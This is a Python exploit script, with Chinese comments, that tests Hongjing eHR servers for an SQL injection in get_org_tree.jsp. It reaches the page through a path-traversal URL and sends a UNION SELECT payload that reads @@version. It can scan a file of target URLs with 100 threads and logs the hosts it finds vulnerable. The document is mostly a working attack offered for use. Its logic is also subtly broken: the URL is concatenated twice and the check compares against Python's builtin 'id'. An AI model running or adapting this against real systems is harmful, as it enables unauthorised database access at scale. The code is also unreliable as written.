import requests,argparse,sys,json,re
from multiprocessing.dummy import Pool
from requests.packages import urllib3
#关闭警告
GREEN = '\033[92m'
RESET = '\033[0m'
urllib3.disable_warnings()
def banner():
    test="""
                  _      
                 | |     
  _   _ _   _  __| |___  
 | | | | | | |/ _` / __| 
 | |_| | |_| | (_| \__ \ 
  \__, |\__, |\__,_|___/ 
   __/ | __/ |           
  |___/ |___/            
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="宏景eHR app_check_in/get_org_tree.jsp SQL注入漏洞复现")
    parser.add_argument('-u','--url',dest='url',type=str,help='link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = target + '/templates/attestation/../../kq/app_check_in/get_org_tree.jsp'
    headers ={
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
                           
    }
    data='params=1=0 union select 1,@@version,3,4--+'

    try:  
        # 尝试发送 POST 请求，并设置超时  
        res1 = requests.post(url=target + payload, headers=headers,verify=False,data=data,timeout=20)  
        if res1.status_code == 200 and id in res1.text:  
            with open('result.txt', 'a', encoding='utf-8') as fp:  
                fp.write(f'[+]{target} 存在注入漏洞\n') 
                print(f"[+]{target}存在注入漏洞") 
        else:  
            print(f"[-]对 {target} 不存在注入漏洞: {res1.status_code}")  
    
    except requests.exceptions.RequestException as e:  
        print(f"请求 {target} 失败: {e}") 

if __name__ == '__main__':
    main()
